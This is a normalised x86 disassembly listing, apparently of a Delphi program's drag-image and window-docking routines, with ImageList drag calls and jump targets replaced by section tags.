mov eax [ eax ]
call sub_46b224
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_42acf0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
lea eax [ ebp - 0xc ]
push eax
push 0x0
call ImageList_GetDragImage
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x1
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call ImageList_Destroy
retn
sub_455520
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_45a4bc
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x78 ] esi
mov [ ebx + 0x70 ] edi
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x74 ] eax
mov eax [ ebp + 0x8 ]
push eax
push edi
push esi
mov eax ebx
call sub_45a690
push eax
call ImageList_BeginDrag
mov al 0x1
mov [ ebx + 0x6a ] al
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_455580
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_45b304
mov eax ebx
call sub_45a4bc
test al al
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x6a ] 0x0
je r-xdata
push esi
push 0x0
call ImageList_GetDragImage
sub_4555ac
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax esi
call sub_45a4bc
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
cmp [ esi + 0x6a ] 0x0
jne r-xdata
mov eax esi
call sub_455454
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_45560c
mov ebx eax
test bl bl
je r-xdata
mov eax [ esi + 0x74 ]
push eax
mov ecx [ esi + 0x70 ]
mov edx [ esi + 0x78 ]
mov eax esi
call sub_455520
push 0x0
call ShowCursor
sub_45560c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
xor ebx ebx
mov eax edi
call sub_45a4bc
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp esi [ edi + 0x6c ]
je r-xdata
mov eax edi
call sub_455670
mov ebx esi
mov [ edi + 0x6c ] ebx
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4553fc
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ edi + 0x6c ]
push eax
call ImageList_DragEnter
cmp eax 0x1
sbb ebx ebx
inc ebx
sub_455670
push ebx
mov ebx eax
mov eax ebx
call sub_45a4bc
test al al
je r-xdata
pop ebx
retn
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax [ ebx + 0x6c ]
push eax
call ImageList_DragLeave
xor eax eax
mov [ ebx + 0x6c ] eax
sub_455694
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_45a4bc
test al al
je r-xdata
xor eax eax
push esp
mov ecx edi
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_4553fc
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
call ImageList_DragMove
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_455708
push ebx
push esi
mov esi eax
mov eax esi
call sub_45a4bc
test al al
je r-xdata
xor ebx ebx
cmp [ esi + 0x6a ] 0x0
je r-xdata
mov eax esi
call sub_455670
call ImageList_EndDrag
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x6a ] 0x0
or edx 0xffffffff
mov eax esi
call sub_455568
push 0xffffffff
call ShowCursor
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_455750
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_44f7b4
mov dl 0x1
mov eax [ r-xdata ]
call sub_42435c
mov esi eax
mov [ ebx + 0x208 ] esi
mov eax esi
mov edx ebx
call sub_44bd68
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_4557ac
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_403190
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44f8d8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_4557fc
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_424660
xor eax eax
push ebp
push sub_45589a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx ebx
call sub_424a8c
xor eax eax
push ebp
push sub_455877
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_44bd80
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45587e
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_424a8c
retn
sub_4558ac
push ebx
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_455940
test al al
je r-xdata
mov ebx [ ebx + 0xc ]
sub_4558c8
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
cmp [ edx + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_455940
push ebx
push esi
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
mov bl 0x1
call sub_455f38
mov esi eax
test esi esi
je r-xdata
mov bl [ edx + 0x57 ]
jmp r-xdata
xor ebx ebx
mov eax esi
call sub_455940
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov esi [ esi + 0xc ]
test esi esi
jne r-xdata
sub_455974
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_455a04
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b864
call sub_40395c
mov edx 0x2
call sub_455a04
jmp r-xdata
retn
sub_4559bc
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_455a70
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b864
call sub_40395c
mov edx 0x2
call sub_455a70
jmp r-xdata
retn
sub_455a04
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
jmp r-xdata
mov edx [ esi + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov ecx edi
mov edx [ eax + 0x14 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
dec al
je r-xdata
mov eax edx
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ esp + 0x4 ]
jmp r-xdata
dec al
jne r-xdata
mov eax [ eax + 0x18 ]
call sub_455e38
jmp r-xdata
add esp 0x10
pop edi
pop esi
retn
xor eax eax
mov eax [ esp ]
jmp r-xdata
sub_455a70
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov ebx eax
mov eax [ ebx + 0x1c ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
cmp al 0x1
jne r-xdata
mov eax [ ebx + 0x1c ]
mov esi [ eax + 0x64 ]
cmp esi [ ebx + 0x14 ]
jne r-xdata
mov eax [ esp + 0x8 ]
sub eax [ esp ]
jmp r-xdata
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
jmp r-xdata
mov esi ebx
jmp r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x1c ]
cmp esi [ eax + 0x64 ]
jne r-xdata
mov eax esi
call sub_455924
dec eax
jne r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
cmp dl [ eax + 0x10 ]
jne r-xdata
mov ecx edi
mov eax [ ebx + 0x1c ]
mov edx [ eax + 0x64 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov esi eax
mov eax esi
call sub_455e38
push eax
mov eax esi
call sub_455974
pop edx
xchg edx eax
sub eax edx
jmp r-xdata
mov eax edx
call sub_455e38
mov eax [ eax + 0x68 ]
jmp r-xdata
sub_455b20
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_455924
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov eax esi
call sub_455f38
mov ebx eax
mov al [ esi + 0x10 ]
dec al
je r-xdata
mov edx 0x1
mov eax esi
call sub_455a70
mov edi eax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_455924
push eax
mov eax edi
pop edx
mov ecx edx
cdq
idiv ecx
mov esi eax
test ebx ebx
je r-xdata
mov edx 0x2
mov eax esi
call sub_455a70
mov edi eax
jmp r-xdata
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
xor edi edi
mov eax ebx
call sub_455974
mov edx eax
add edx esi
mov eax ebx
call sub_455e60
mov edx edi
mov eax ebx
call sub_455e60
jmp r-xdata
mov eax ebx
call sub_455cc0
mov eax ebx
call sub_455f10
mov ebx eax
test ebx ebx
jne r-xdata
sub_455bc8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
call sub_403f20
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
call sub_403f74
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b920
call sub_40395c
sub_455c0c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov ebx eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x1c ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov si 0xffb9
call sub_40338c
cmp [ ebp - 0x8 ] 0x0
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
mov [ eax + 0x38 ] ebx
xor eax eax
push ebp
push sub_455c7d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_44de8c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x38 ] edx
retn
sub_455c90
push ebp
mov ebp esp
push ebx
push esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x14 ]
test esi esi
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax esi
call sub_455f10
test eax eax
je r-xdata
mov esi [ esi + 0x14 ]
test esi esi
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_455cc0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp [ edx + 0x6c ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
mov [ eax + 0x9c ] dl
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_455a70
mov ebx eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_455a70
mov esi eax
push ebp
call sub_455c90
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_455f10
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x64 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
jne r-xdata
push esi
lea eax [ ebp - 0x14 ]
push eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_455a04
push eax
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_455a04
mov ecx ebx
pop edx
call sub_416e5c
lea ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov ebx [ eax ]
call [ ebx ]
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_44cb4c
mov eax [ ebp - 0x4 ]
call sub_455e38
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x64 ]
call sub_455e38
cmp edi eax
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_455e38
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x68 ]
jl r-xdata
sub_455e38
push ebx
mov ebx eax
mov eax ebx
call sub_455940
test al al
jne r-xdata
mov eax [ ebx + 0x20 ]
pop ebx
retn
mov eax ebx
call sub_4558c8
test al al
je r-xdata
mov eax ebx
call sub_455974
pop ebx
retn
sub_455e74
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_455e60
mov ebx [ ebx + 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_455910
test eax eax
jle r-xdata
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_455e64
mov edx esi
call sub_455e74
sub_455eb0
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_455e38
mov edi eax
mov eax ebx
call sub_455974
cmp edi eax
jl r-xdata
mov eax esi
call sub_455b20
mov eax [ esi + 0x1c ]
push eax
push sub_4579c0
mov edx esi
call sub_4561ec
mov eax ebx
call sub_455e38
mov edi eax
mov eax esi
call sub_4559bc
cmp edi eax
jle r-xdata
mov eax ebx
call sub_455eb0
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
sub_455f1c
push ebx
mov ebx [ eax + 0x18 ]
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_455940
test al al
je r-xdata
mov ebx [ ebx + 0x18 ]
sub_455f44
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_403160
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x4
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x70 ] 0x40000
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0xc
mov eax [ ebp - 0xc ]
mov al [ eax + 0x5b ]
cmp al 0x1
je r-xdata
add esp 0xfffffff0
call sub_4034f4
xor eax eax
jmp r-xdata
cmp al 0x2
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] al
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4558ec
mov edx [ ebp - 0x4 ]
mov [ edx + 0x64 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424064
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] ebx
mov edx 0xffffff
xor eax eax
call sub_42a714
mov edx eax
mov eax ebx
call sub_4241e0
mov eax [ ebp - 0x4 ]
call sub_456114
xor eax eax
push ebp
push sub_456050
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_4507b8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
call sub_455b20
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456057
mov eax [ ebp - 0x4 ]
call sub_456118
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_45077c
mov edx eax
mov cl 0x3
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_456057
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov ecx [ edx + 0x38 ]
mov [ eax + 0x30 ] ecx
mov ecx [ edx + 0x3c ]
mov [ eax + 0x34 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x3c ] edx
mov [ eax + 0x38 ] sub_457ee8
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_4560ac
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov edx [ esi + 0x64 ]
mov eax esi
call sub_457118
mov eax [ esi + 0x10 ]
call sub_403190
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403180
test bl bl
jle r-xdata
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x30 ]
mov [ eax + 0x38 ] edx
mov edx [ esi + 0x34 ]
mov [ eax + 0x3c ] edx
xor eax eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_45612c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
pop ebx
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0xc ]
call sub_45612c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
call sub_45612c
pop ecx
sub_456184
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] edx
xor edx edx
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
cmp [ eax + 0x64 ] 0x0
je r-xdata
push ebp
mov eax [ eax + 0x64 ]
call sub_45612c
pop ecx
sub_4561b0
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
lea esi [ eax + 0x8 ]
mov edx ebx
mov eax [ esi + 0x4 ]
call [ esi ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_4561b0
pop ecx
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_4561b0
pop ecx
sub_456204
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
call sub_456184
mov ebx eax
test ebx ebx
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_455a70
push eax
lea eax [ esp + 0x4 ]
push eax
mov edx 0x2
mov eax ebx
call sub_455a70
push eax
mov edx 0x1
mov eax ebx
call sub_455a04
push eax
mov edx 0x2
mov eax ebx
call sub_455a04
pop edx
pop ecx
call sub_416e5c
mov edi esi
mov esi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax esi
xor ecx ecx
mov edx 0x10
call sub_402ba4
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_456288
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x64 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov [ eax + 0x4 ] esi
call sub_455cc0
jmp r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov [ ebp - 0x1 ] 0x4
sub al 0x5
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov ecx edi
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
call sub_416e5c
push esi
lea esi [ ebp - 0x30 ]
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi ]
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_44cb4c
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4558ec
mov edx [ ebx + 0x64 ]
mov [ edx + 0x8 ] eax
mov [ eax + 0x14 ] edx
mov [ eax + 0x4 ] esi
jmp r-xdata
test edi edi
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_456184
mov [ ebp - 0x8 ] eax
xor eax eax
mov al [ ebp - 0x1 ]
mov al [ eax + rw-data ]
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x64 ]
call sub_455910
dec eax
jne r-xdata
mov edx eax
mov eax ebx
call sub_4571b0
mov edx esi
mov eax ebx
call sub_456184
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax esi
call sub_44d130
mov edi eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4558ec
mov [ eax + 0x4 ] esi
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edi [ ebx + 0x64 ]
mov al [ ebp - 0x9 ]
mov [ edi + 0x10 ] al
mov al [ ebp - 0x9 ]
dec al
je r-xdata
mov eax esi
call sub_44d11c
mov [ ebp - 0x10 ] eax
mov edx [ ebx + 0x64 ]
mov dl [ edx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
jmp r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x2
call sub_455a70
mov edx eax
mov eax edi
call sub_455e60
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x1
call sub_455a70
mov [ ebx + 0x68 ] eax
jmp r-xdata
dec al
je r-xdata
cmp dl [ ebp - 0x9 ]
jne r-xdata
mov [ ebp - 0x9 ] dl
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x1
call sub_455a70
mov edx eax
mov eax edi
call sub_455e60
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x2
call sub_455a70
mov [ ebx + 0x68 ] eax
jmp r-xdata
mov dl [ ebp - 0x9 ]
push edx
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_456498
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_456640
jmp r-xdata
sub_456498
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4558ec
mov ebx eax
mov al [ ebp + 0xc ]
mov [ ebx + 0x10 ] al
test edi edi
jne r-xdata
mov eax edi
call sub_455e38
mov edx eax
mov eax ebx
call sub_455e60
mov eax [ edi + 0x14 ]
mov [ ebx + 0x14 ] eax
mov eax [ edi + 0x18 ]
mov [ ebx + 0x18 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0x68 ]
mov eax ebx
call sub_455e60
mov eax [ esi + 0x64 ]
call sub_455e38
mov [ esi + 0x68 ] eax
mov al [ ebp + 0xc ]
mov [ esi + 0x48 ] al
xor eax eax
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] 0x3fe00000
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ edi + 0xc ]
mov [ ebx + 0xc ] eax
test eax eax
je r-xdata
mov [ eax + 0xc ] ebx
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x18 ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_457508
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_4561ec
mov eax [ esi + 0x64 ]
call sub_455e38
sar eax 0x1
jns r-xdata
mov eax [ esi + 0x64 ]
